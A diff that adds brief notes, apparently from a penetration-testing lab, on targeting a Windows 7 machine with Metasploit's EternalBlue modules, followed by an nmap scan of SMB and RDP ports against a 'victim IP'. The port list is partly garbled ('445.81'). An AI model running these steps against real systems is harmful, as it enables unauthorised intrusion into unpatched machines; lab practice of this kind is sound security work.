@@ -1,0 +1,13 @@
+<!--Generate the Met-Eternalblue attack -->
+
+sudo msfconsole -q
+>search eternalblue
+>use 26 (scanner module of eternalblue)
+>show options
+>set rhosts 192.168.xxx.xxx (Windows 7) machine
+
+
+
+
+nmap -sT -p 445.81, 3389 <victim IP >
+
